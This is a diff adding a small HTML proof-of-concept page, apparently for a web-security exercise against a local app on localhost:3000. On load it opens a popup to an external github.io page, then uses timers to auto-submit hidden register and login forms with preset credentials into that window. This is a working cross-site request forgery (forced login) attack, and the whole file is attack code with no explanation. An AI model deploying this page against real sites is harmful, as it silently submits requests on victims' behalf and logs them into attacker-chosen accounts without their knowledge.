@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="popup">
+  <input name="username" value="fast1">
+  <input name="password" value="fast1">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="popup">
+  <input name="username" value="fast1">
+  <input name="password" value="fast1">
+</form>
+
+<script>
+var popup = window.open('https://kiranshownny.github.io/webtest/ex2.html', 'popup');
+
+setTimeout(function(){
+  document.getElementById('regForm').submit();
+}, 100);
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 300);
+</script>
+</body>
+</html>
